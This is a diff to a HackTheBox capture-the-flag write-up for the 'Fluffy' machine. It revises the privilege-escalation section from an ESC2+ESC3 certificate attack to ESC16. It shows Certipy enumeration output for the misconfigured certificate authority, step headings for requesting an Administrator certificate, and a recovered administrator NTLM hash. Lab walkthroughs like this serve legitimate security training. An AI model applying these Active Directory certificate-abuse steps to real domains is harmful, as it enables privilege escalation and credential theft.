@@ -1,6 +1,6 @@
 ---
 title: "HackTheBox - Fluffy"
-description: "Fluffy is an easy difficulty box focused on Active Directory exploitation. After finding notes on vulnerabilites intended to patch, we can exploit one as it is not yet fixed. From there, Bloodhound assists with showing excessive ACL permissions that allow us to create shadow credentials on service accounts, including ca_svc the certificate authority account. Certificates are misconfigured, allowing us to elevate to Administrator permissions via ESC2+ESC3 exploitation combination."
+description: "Fluffy is an easy difficulty box focused on Active Directory exploitation. After finding notes on vulnerabilites intended to patch, we can exploit one as it is not yet fixed. From there, Bloodhound assists with showing excessive ACL permissions that allow us to create shadow credentials on service accounts, including ca_svc the certificate authority account. Certificates are misconfigured, allowing us to elevate to Administrator permissions via ESC16 exploitation combination."
 date: 2025-09-20T22:28:58-05:00
 image: "Images/Banner.png"
 math: 
@@ -411,25 +411,43 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] Wrote JSON output to '20250527044711_Certipy.json'
 ```
 
-### Leveraging Certipy to abuse ESC2+ESC3
+### Leveraging Certipy to abuse ESC16
 
-From the output, we can see Certificate 32 is vulnerable to ESC2+ESC3:
+From the output, we can see Certificate 0 is vulnerable to ESC16:
 
 ```json
-    "32": {
-      "Template Name": "User",
-      "Display Name": "User",
-      "Certificate Authorities": [
-        "fluffy-DC01-CA"
-      ],
- <...SNIP...>
-      "[+] User Enrollable Principals": [
-        "FLUFFY.HTB\\Domain Users"
-      ],
+"Certificate Authorities": {
+    "0": {
+      "CA Name": "fluffy-DC01-CA",
+      "DNS Name": "DC01.fluffy.htb",
+      "Certificate Subject": "CN=fluffy-DC01-CA, DC=fluffy, DC=htb",
+<...SNIP...>      
+      "Permissions": {
+        "Owner": "FLUFFY.HTB\\Administrators",
+        "Access Rights": {
+          "1": [
+            "FLUFFY.HTB\\Domain Admins",
+            "FLUFFY.HTB\\Enterprise Admins",
+            "FLUFFY.HTB\\Administrators"
+          ],
+          "2": [
+            "FLUFFY.HTB\\Domain Admins",
+            "FLUFFY.HTB\\Enterprise Admins",
+            "FLUFFY.HTB\\Administrators"
+          ],
+          "512": [
+            "FLUFFY.HTB\\Cert Publishers"
+          ]
+        }
+      },
+      "[!] Vulnerabilities": {
+        "ESC16": "Security Extension is disabled."
+      },
       "[*] Remarks": {
-        "ESC2 Target Template": "Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.",
-        "ESC3 Target Template": "Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1."
+        "ESC16": "Other prerequisites may be required for this to be exploitable. See the wiki for more details."
       }
+    }
+  },
 ```
 
 The wiki mentioned is the following: https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
@@ -446,7 +464,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] Successfully updated 'ca_svc'
 ```
 
-Next requesting the "Any Purpose" certificate:
+Next requesting the certificate under the UPN context Administrator:
 
 ```
 ┌──(certipy-venv)─(kali㉿kali)-[~/Documents/fluffy]
@@ -475,7 +493,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] Successfully updated 'ca_svc'
 ```
 
-Next, requesting a certificate on behalf of the Administrator:
+Next, attempting to authenticate using the Administrator pfx:
 
 ```
 ┌──(certipy-venv)─(kali㉿kali)-[~/Documents/fluffy]
@@ -493,7 +511,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
 ```
 
-Now we can authenticate as admin!
+Now we can access the host as admin!
 
 ```
 ┌──(certipy-venv)─(kali㉿kali)-[~/Documents/fluffy]
